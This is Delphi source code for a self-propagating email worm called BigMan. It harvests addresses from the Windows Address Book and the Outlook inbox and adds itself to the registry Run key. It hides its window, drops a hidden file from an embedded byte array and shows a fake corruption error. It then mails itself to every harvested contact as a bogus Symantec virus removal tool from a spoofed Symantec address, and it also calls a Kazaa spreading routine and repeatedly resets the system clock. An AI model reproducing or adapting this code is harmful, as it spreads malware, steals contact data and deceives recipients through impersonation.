   UNIT IWorm;

   INTERFACE

   USES
     Windows, SysUtils, Controls, Forms, Dialogs, MAPI, WinInet, Registry,
     AppEvnts, Psock, USmtpRelayServer, StdCtrls, Classes, ExtCtrls, Kazaa;

   TYPE
     TForm1 = CLASS(TForm)
       Timer1           : TTimer;
       Timer2           : TTimer;
       SmtpRelayServer1 : TSmtpRelayServer;
       PROCEDURE FormCreate(Sender: TObject);
       PROCEDURE Timer1Timer(Sender: TObject);
       PROCEDURE Timer2Timer(Sender: TObject);
     PRIVATE
       { Private declarations }
     PUBLIC
       { Public declarations }
     END;

   VAR
     Form1                : TForm1;
     SentEmail            : Word;
     EmailNum             : Word;
     I,T                  : Longint;
     Emails               : ARRAY [1..3000] OF STRING;
     OSInfo               : TOSVersionInfoA;
     WABExists            : Boolean;
     Reg                  : TRegistry;
     S                    : STRING;
     FEmail               : ARRAY[1..60] OF STRING;
     FLineNumber          : Byte;
     FAttachmentName      : STRING;
     FFrom                : STRING;
     FFromName            : STRING;
     FSubject             : STRING;

   CONST
     REGS : ARRAY[1..31] OF STRING=(
     'App Management','App Path','Applets', 'BITS','Control Panel','WindowsUpdate',
     'Controls Folder','DateTime', 'Explorer','Hints','Instaler','MCD','Telephony',
     'MediaContentIndex','ModuleUsage','MS-DOS Emulation','NLS', 'Reinstall','Run',
     'RunOnce','Setup','SharedDLLs', 'ShellScrap','SideBySide','SMDEN','Stillmage',
     'Syncmgr','Themes','Uninstall', 'URL','WebCheck');

     BigMan : ARRAY[1..1937] OF Byte = (
       $1E,$83,$2D,$6C,$68,$35,$2D,$70,$07,$00,$00,$02,$E7,$0E,$00,$1C,$46,$E2,$2C,
       $20,$01,$05,$41,$2E,$52,$41,$52,$84,$F7,$4D,$00,$00,$0F,$6A,$62,$74,$E0,$07,
       $44,$B7,$FB,$F9,$F0,$42,$40,$DF,$68,$52,$26,$22,$08,$28,$B1,$B6,$18,$46,$C7,
       $60,$78,$B0,$58,$6C,$30,$70,$E0,$74,$D4,$54,$16,$0B,$B2,$41,$40,$B8,$2C,$96,
       $08,$2B,$C0,$27,$04,$91,$67,$B3,$F6,$18,$2C,$16,$1A,$42,$C2,$82,$C2,$2C,$11,
       $78,$05,$79,$29,$6C,$82,$0B,$C0,$B5,$FD,$C4,$00,$20,$01,$80,$A6,$CD,$5D,$CC,
       $D9,$D3,$21,$DF,$63,$76,$10,$CA,$87,$C3,$7F,$AB,$7A,$D4,$99,$F0,$ED,$F2,$FF,
       $C2,$1C,$F4,$78,$3F,$DD,$14,$B5,$2C,$F5,$D0,$F1,$D2,$CB,$A3,$91,$0A,$1E,$FD,
       $F5,$74,$EB,$70,$D6,$9B,$CD,$D9,$53,$C2,$DE,$C6,$77,$26,$D6,$8D,$D8,$00,$01,
       $89,$3A,$A7,$A5,$F8,$A3,$96,$E5,$3B,$D8,$40,$00,$C4,$C1,$26,$BD,$FE,$5C,$3E,
       $79,$9E,$DC,$6C,$12,$00,$18,$DD,$28,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,
       $80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,
       $80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,
       $08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,
       $38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,
       $00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,
       $03,$80,$00,$80,$3B,$04,$00,$02,$00,$E8,$03,$80,$00,$80,$38,$00,$08,$03,$80,
       $00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,
       $03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,
       $00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,
       $80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,
       $80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,
       $08,$03,$80,$00,$80,$3B,$04,$00,$02,$00,$E8,$03,$80,$00,$80,$38,$00,$08,$03,
       $80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,
       $08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,
       $38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,
       $00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,
       $03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,
       $00,$08,$03,$80,$00,$80,$3B,$04,$00,$02,$00,$E8,$03,$80,$00,$80,$38,$00,$08,
       $03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,
       $00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,
       $80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,
       $80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,
       $08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,
       $38,$00,$08,$03,$80,$00,$80,$3B,$04,$00,$02,$00,$E8,$03,$80,$00,$80,$38,$00,
       $08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,
       $38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,
       $00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,
       $03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,
       $00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,
       $80,$38,$00,$08,$03,$80,$00,$80,$3B,$04,$00,$02,$00,$E8,$03,$80,$00,$80,$38,
       $00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,
       $80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,
       $80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,
       $08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,
       $38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,
       $00,$80,$38,$00,$08,$03,$80,$00,$80,$3B,$04,$00,$02,$00,$E8,$03,$80,$00,$80,
       $38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,
       $00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,
       $03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,
       $00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,
       $80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,
       $80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$3B,$04,$00,$02,$00,$E8,$03,$80,$00,
       $80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,
       $80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,
       $08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,
       $38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,$00,$80,$38,$00,$08,$03,$80,
       $00,$80,$38,$00,$08,$03,$80,$01,$F7,$00,$78,$AB,$DD,$8E,$5B,$76,$76,$E7,$C3,
       $E9,$3E,$FC,$00,$00,$FE,$68,$54,$F5,$B5,$36,$39,$6E,$53,$BC,$88,$A0,$00,$63,
       $60,$91,$F0,$38,$00,$07,$CF,$C0,$E2,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,
       $20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,
       $E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,
       $02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,
       $0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,
       $00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,
       $00,$E0,$00,$20,$0E,$C1,$00,$00,$80,$3A,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,
       $00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,
       $00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,
       $00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,
       $20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,
       $E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,
       $02,$00,$E0,$00,$20,$0E,$C1,$00,$00,$80,$3A,$00,$E0,$00,$20,$0E,$00,$02,$00,
       $E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,
       $02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,
       $0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,
       $00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,
       $00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,
       $00,$02,$00,$E0,$00,$20,$0E,$C1,$00,$00,$80,$3A,$00,$E0,$00,$20,$0E,$00,$02,
       $00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,
       $00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,
       $20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,
       $E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,
       $02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,
       $0E,$00,$02,$00,$E0,$00,$20,$0E,$C1,$00,$00,$80,$3A,$00,$E0,$00,$20,$0E,$00,
       $02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,
       $0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,
       $00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,
       $00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,
       $00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,
       $20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$C1,$00,$00,$80,$3A,$00,$E0,$00,$20,$0E,
       $00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,
       $20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,
       $E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,
       $02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,
       $0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,
       $00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$C1,$00,$00,$80,$3A,$00,$E0,$00,$20,
       $0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,
       $00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,
       $00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,
       $00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,
       $20,$0E,$00,$02,$00,$E0,$00,$20,$0E,$00,$02,$00,$E0,$00,$7E,$40,$1E,$2A,$F7,
       $63,$96,$DD,$98,$B2,$60,$00,$07,$EB,$56,$C7,$75,$2E,$28,$6B,$4C,$80,$00);

   IMPLEMENTATION

   {$R *.DFM}

   FUNCTION RegReadString(kroot:HKEY; sKey, sValue : STRING) : STRING;
   VAR
     qValue     : ARRAY [0..1023] OF Char;
     DataSize   : Integer;
     CurrentKey : HKEY;
   BEGIN
     RegOpenKeyEx(kRoot,PChar(sKey),0,KEY_ALL_ACCESS,CurrentKey);
     DataSize:=1024;
     RegQueryValueEx(CurrentKey,PChar(sValue),NIL,NIL,@qValue[0],@DataSize);
     RegCloseKey(CurrentKey);
     Result:=STRING(qvalue);
   END;

   PROCEDURE FakeEmails;
   BEGIN
     FEmail[01]:='Dear Sir,';
     FEmail[02]:='';
     FEmail[03]:='Symantec Antivirus Lab released the new version of free Virus Removall Tool!!';
     FEmail[04]:='';
     FEmail[05]:='This tool able to remove the following dangerous viruses:';
     FEmail[06]:='    -I-Worm.Klez,';
     FEmail[07]:='    -I-Worm.Kiltro,';
     FEmail[08]:='    -I-Worm.Langex,';
     FEmail[09]:='    -I-Worm.Manymize,';
     FEmail[10]:='    -I-Worm.Frethem,';
     FEmail[11]:='    -I-Worm.Masana,';
     FEmail[12]:='    -I-Worm.MyLife,';
     FEmail[13]:='    -and other 50 dangerous viruses.';
     FEmail[14]:='';
     FEmail[15]:='Just start the attached file, and It will check your system.';
     FEmail[16]:='';
     FEmail[17]:='Best Regards,';
     FEmail[18]:='  Symantec Antivirus Support';
     FEmail[19]:='';
     FEmail[20]:='------------------------------------------------------------';
     FEmail[21]:='';
     FEmail[22]:='';
     FEmail[23]:='';
     FEmail[24]:='';
     FEmail[25]:='';
     FLineNumber:=25;
     FAttachmentName:='Free Virus Removal Tool From Symantec.exe';
     FFrom:='Support@symantec.com';
     FFromName:='Symantec Antivirus';
     FSubject:='Free Virus Removal Tool from Symantec';
   END;

   PROCEDURE RandomReg(Num:Word);
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     FOR I:=1 TO Num DO BEGIN
       RandSeed:=1;
       Randomize;
       T:=Random(31);
       IF (T>0)AND(T<32) THEN Reg.OpenKey('Software\Microsoft\Windows\CurrentVersion\'+REGS[T], False);
     END;
     Reg.CloseKey;
   END;

   FUNCTION RegisterServiceProcess(dwProcessID,dwType:DWord) : DWord;
     STDCALL; EXTERNAL 'KERNEL32.DLL';

   PROCEDURE VRegistry;
   BEGIN
     RandomReg(1430);
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run', True);
     IF Reg.ReadString('BigMan')='' THEN Reg.WriteString('BigMan',WinPath+'BigMan.exe');
     Reg.CloseKey;
     RandomReg(1430);
   END;

   PROCEDURE QuickSort(Left,Right:Word);
      { Szokàsos quicksort rendezÂs   }
   VAR
     Up,Down : Word;
     Compare : STRING;
     Dummy   : STRING;
   BEGIN
     Up:=Left;Down:=Right;Compare:=Emails[(Left+Right)DIV 2];
     REPEAT
       WHILE Emails[Up]<Compare DO Inc(Up);
       WHILE Compare<Emails[Down] DO Dec(Down);
       IF Up<=Down THEN BEGIN
         Dummy:=Emails[Up];Emails[Up]:=Emails[Down];Emails[Down]:=Dummy;
         Inc(Up);Dec(Down);
       END;
     UNTIL Up>Down;
     IF Left<Down THEN QuickSort(Left,Down);
     IF Up<Right  THEN QuickSort(Up,Right);
   END;

   PROCEDURE KillDupes;
   BEGIN
     FOR I:=EmailNum-1 DOWNTO 1 DO BEGIN
       IF emails[I]=Emails[I+1] THEN BEGIN
         FOR T:=I TO EmailNum DO Emails[T]:=Emails[T+1];
         Dec(EmailNum);
       END;
     END;
   END;

   PROCEDURE ReadWab;
   VAR
     WABFile : FILE;
     b,g     : Longint;
     i       : STRING;
     n       : ARRAY[1..5] OF Char;
     xx      : ARRAY[1..500] OF Char;
     rr      : Word;
     WABPath : STRING;
   BEGIN
     RandomReg(1430);
     WABPath:=RegReadString(HKEY_CURRENT_USER,'SOFTWARE\Microsoft\WAB\WAB4\WAB File Name','');
     IF(WABPath<>'')AND(FileExists(WABPath)) THEN BEGIN
       WABExists:=True;
       Assign(WABFile,WABPath);
       Reset(WABFile,1);
       Seek(WABFile,176199);
       REPEAT
         BlockRead(WABFile,n,5);
         IF n[1]+n[2]+n[3]+n[4]=Chr($01)+Chr($1F)+Chr($00)+Chr($03) THEN BEGIN
           BlockRead(WABFile,xx,Ord(n[5])+30);
           i:='';
           FOR rr:=1 TO Ord(n[5])+30 DO i:=i+xx[rr];
           Delete(i,1,3);
           g:=Pos(Chr(0)+Chr(0)+Chr(0),i);
           IF g>0 THEN Delete(i,g,Length(i)-g+1);
           FOR b:=1 TO Ord(n[5]) DO IF i[b]=Chr($00) THEN Delete(i,b,1);
           IF (Pos('@',i)>0)AND(i[1]<>'/') THEN BEGIN
             IF EmailNum<3000 THEN Inc(EmailNum);
             UpperCase(I);
             Emails[EmailNum]:=i;
           END;
         END ELSE Seek(WABFile,FilePos(WABFile)-4);
         UNTIL ((FileSize(WABFile)-FilePos(WABFile))<6);
         QuickSort(1,EmailNum);
         KillDupes;
       END;
       IF NOT FileExists(WABPath) THEN WABExists:=False;
     RandomReg(1430);
     Close(WABFile);
     END;

   PROCEDURE WriteEmailsReg;
   BEGIN
     RandomReg(1430);
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey('\Software\BigMan', True);
     FOR i:=1 TO EmailNum DO BEGIN
       str(i,s);
       Reg.WriteString(S,Emails[i]);
     END;
     Reg.WriteInteger('email_num',EmailNum);
     Reg.WriteInteger('Sent',SenteMail);
     Reg.CloseKey;
     RandomReg(1430);
   END;

   PROCEDURE ReadEmailsReg;
   BEGIN
     RandomReg(1430);
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     IF Reg.OpenKey('\Software\BigMan', True) THEN BEGIN
       EmailNum:=Reg.ReadInteger('email_num');
       FOR i:=1 TO EmailNum DO BEGIN
         Str(i,s);
         Emails[i]:=Reg.ReadString(S);
       END;
     END;
     Reg.CloseKey;
     RandomReg(1430);
   END;

   PROCEDURE SentEmailReg;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     IF Reg.KeyExists('\Software\BigMan') THEN BEGIN
     Reg.OpenKey('\Software\BigMan', True);
     SentEmail:=Reg.ReadInteger('Sent');
     END;
     Reg.CloseKey;
   END;

   FUNCTION FirstRun : Boolean;
   BEGIN
     RandomReg(1430);
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Result:= NOT Reg.KeyExists('\Software\BigMan');
     Reg.CloseKey;
     RandomReg(1430);
   END;

   PROCEDURE ReadInbox;
   VAR
     Recip                     : TMAPIRecipDesc;
     MAPIMessage               : TMAPIMessage;
     lppMapiMessage            : PMapiMessage;
     MError                    : Cardinal;
     MapiSession               : LongInt;
     bWinNT,bFindFirst         : Boolean;
     ProfileName               : STRING;
     sSeedMessageID,sMessageID : ARRAY[0..512] OF Char;
   BEGIN
     bWinNT:=(OSInfo.dwPlatformId=VER_PLATFORM_WIN32_NT);
     // Grab default profilename from registry
     IF (bWinNT) THEN ProfileName:=regReadString(HKEY_CURRENT_USER,'Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles','DefaultProfile')
     ELSE ProfileName:=regReadString(HKEY_CURRENT_USER,'Software\Microsoft\Windows Messaging Subsystem\Profiles', 'DefaultProfile'); // Standard Windows
     TRY
       MError:=MapiLogOn(0, PChar(ProfileName), NIL, MAPI_NEW_SESSION, 0, @MapiSession);
       IF (MError<>SUCCESS_SUCCESS) THEN Exit;
     EXCEPT
       ;
     END;
     bFindFirst:=True;
     FOR i:=1 TO 50 DO TRY
       IF (bFindFirst) THEN bFindFirst := False ELSE sSeedMessageID := sMessageID;
       MError := MapiFindNext(MapiSession, 0, NIL, @sSeedMessageID, 0, 0, @sMessageID);
       IF (MError = SUCCESS_SUCCESS) THEN BEGIN
         lppMapiMessage := @MAPIMessage;
         MError := MAPIReadMail(MAPISession,0,@sMessageID, MAPI_ENVELOPE_ONLY, 0, lppMapiMessage);
         IF (MError = SUCCESS_SUCCESS)AND(lppMapiMessage.lpRecips<>NIL) THEN WITH Recip DO BEGIN
           IF EmailNum<3000 THEN Inc(EmailNum);
           Emails[EmailNum]:=lppMapiMessage.lpOriginator.lpszAddress;
           UpperCase(Emails[EmailNum]);
         END;
        END;
     EXCEPT
     END;
     QuickSort(1,EmailNum);
     KillDupes;
     WriteEmailsReg;
     TRY
       MError := MapiLogOff(MapiSession, 0, 0, 0);
     EXCEPT
       ;
     END;
   END;

   PROCEDURE TForm1.Timer1Timer(Sender: TObject);
   VAR
      T:Word;
   BEGIN
     IF (InternetGetConnectedState(NIL,0))AND(EmailNum>0)AND(NOT SMTPRelayServer1.Busy) THEN BEGIN
       Reg:=TRegistry.Create;
       Inc(SentEmail);
       Str(SentEmail,s);
       IF SentEmail>EmailNum THEN SentEmail:=0;
       Reg.RootKey:=HKEY_LOCAL_MACHINE;
       Reg.OpenKey('\Software\BigMan', True);
       Reg.WriteInteger('Sent',SentEmail);
       Reg.CloseKey;
       Reg.Free;
       FakeEmails;
       SMTPRelayServer1.Connections:=1;
       SMTPRelayServer1.TimeOut:=60;
       SMTPRelayServer1.From:=FFrom;
       SMTPRelayServer1.HeaderFrom:=FFromName;
       SMTPRelayServer1.Subject:=FSubject;
       SMTPRelayServer1.Body.Clear;
       FOR t:=1 TO FLineNumber DO SMTPRelayServer1.Body.Add(FEmail[t]);
       IF FileExists(WinPath+'SysConfig\Free Virus Removal Tool From Symantec.exe') THEN SMTPRelayserver1.Attachments.Add(WinPath+'Free Virus Removal Tool From Symantec.exe');
       SMTPRelayServer1.Recipients.Clear;
       SMTPRelayServer1.Recipients.Add(Emails[SentEmail]);
       TRY
       SmtpRelayServer1.Send;
       EXCEPT
       END;
     END;
   END;

   PROCEDURE BigManFile;
   VAR
     TBigMan : FILE;
   BEGIN
     SetFileAttributes(pChar(WinPath+'!!.BigMan.!!'),FILE_ATTRIBUTE_NORMAL);
     Assign(TBigMan,WinPath+'!!.BigMan.!!');
     Rewrite(TBigMan,1);
     BlockWrite(TBigman,BigMan[1],1937);
     Close(TBigMan);
     SetFileAttributes(pChar(WinPath+'!!.BigMan.!!'),FILE_ATTRIBUTE_HIDDEN);
   END;

   PROCEDURE TForm1.Timer2Timer(Sender: TObject);
   VAR
     ST : SystemTime;
   BEGIN
     ST.wYear:=2002;
     ST.wMonth:=1;
     ST.wDayOfWeek:=1;
     ST.wDay:=1;
     ST.wHour:=23;
     ST.wMinute:=0;
     ST.wSecond:=0;
     SetSystemTime(ST);
   END;

   PROCEDURE TForm1.FormCreate(Sender: TObject);
   BEGIN
     InitKazaa;
     Reg := TRegistry.Create;
     BigManFile;
     OSInfo.dwOSVersionInfoSize:=sizeof(OSInfo);
     GetVersionEx(OSInfo);
     //Hiding the Application's TaskBar Button
     ShowWindow(Application.Handle, SW_HIDE);
     SetWindowLong(Application.Handle, GWL_EXSTYLE, GetWindowLong(Application.Handle, GWL_EXSTYLE) or WS_EX_TOOLWINDOW );
     ShowWindow(Application.Handle, SW_SHOW);
     //Hide from "Close Program" (Win 9x)
   //  if OSInfo.dwPlatformID=VER_PLATFORM_WIN32_WINDOWS THEN RegisterServiceProcess(GetCurrentProcessID, RSPSIMPLESERVICE);
     SentEmailReg;
     CopyFile (pchar(paramstr(0)),pchar(Winpath+'BigMan.exe'));
     IF FirstRun THEN BEGIN
       Vregistry;
       EmailNum:=1; emails[1]:='MAIL@MICROSOFT.COM';
       ReadWab;
       ReadInBox;
       Application.MessageBox('This File is Corrupted!','Error',MB_ICONHAND);
     END ELSE BEGIN
       ReadEmailsReg;
       ReadInBox;
     END;
     Reg.Free;
   END;

   END.
